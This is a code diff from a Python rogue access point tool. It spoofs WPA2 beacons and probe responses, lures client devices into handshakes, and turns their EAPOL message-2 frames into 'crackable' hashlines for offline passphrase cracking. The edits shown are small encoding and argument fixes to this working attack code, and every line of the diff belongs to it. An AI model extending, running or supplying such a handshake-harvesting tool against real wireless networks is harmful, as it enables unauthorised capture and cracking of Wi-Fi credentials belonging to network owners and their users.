@@ -62,7 +62,7 @@ def _synth_beacon(bssid: bytes, ssid: str, channel: int) -> bytes:
     """Fallback WPA2-PSK beacon when the real one can't be captured (AP out of range)."""
     hdr = b"\x80\x00" + b"\x00\x00" + _BCAST + bssid + bssid + b"\x00\x00"
     fixed = struct.pack("<Q", 0) + struct.pack("<H", _BEACON_INTERVAL_TU) + b"\x11\x04"
-    tags = (ssid_ie(ssid) + rates_ie() + ds_param_ie(channel) + ext_rates_ie() + GENERIC_RSN_IE)
+    tags = (ssid_ie(ssid.encode("utf-8")) + rates_ie() + ds_param_ie(channel) + ext_rates_ie() + GENERIC_RSN_IE)
     return hdr + fixed + tags
 
 
@@ -122,7 +122,7 @@ class ApResponder:
         subtype = pkt.subtype_id
         if subtype == 0x04:                           # probe request
             ssid = getattr(pkt, "ssid", None)
-            if ssid in (None, "", "<hidden>", self.ssid):
+            if ssid in (None, "", self.ssid):
                 frame = self._probe_resp[:4] + client + self._probe_resp[10:]
                 self._send(frame, "probe", client)
         elif addr1 != self.bssid:                     # auth/assoc must be to us
@@ -154,7 +154,7 @@ class ApResponder:
         self.stats["m2"] += 1
         print(f"[#] M2    <- {_mac_str(client)} #{self.stats['m2']} (SNonce {(pkt.nonce or b'')[:4].hex()}...)")
         hs = self._assemble(client, anonce, pkt)
-        lines = eapol_hashlines(self.ssid, hs)
+        lines = eapol_hashlines(self.ssid.encode("utf-8"), hs)
         if not lines:
             print(f"[-] M2 from {_mac_str(client)} did not form a crackable pair")
             return
@@ -169,7 +169,7 @@ class ApResponder:
     def _assemble(self, client: bytes, anonce: bytes, m2) -> Handshake:
         m1_frame = eapol_m1(self.bssid, client, anonce, replay=1)
         hs = Handshake(bssid=self.bssid_str, client_mac=_mac_str(client),
-                       beacon_frame=self.beacon_frame, akm_offered=[2, 8], akm_client=2)
+                       beacon_frame=self.beacon_frame, akm_offered=[2, 8])
         hs.messages.append(HandshakeMessage(
             raw=m1_frame, msg_num=1, replay_hex="0000000000000001",
             nonce=anonce, mic=bytes(16),
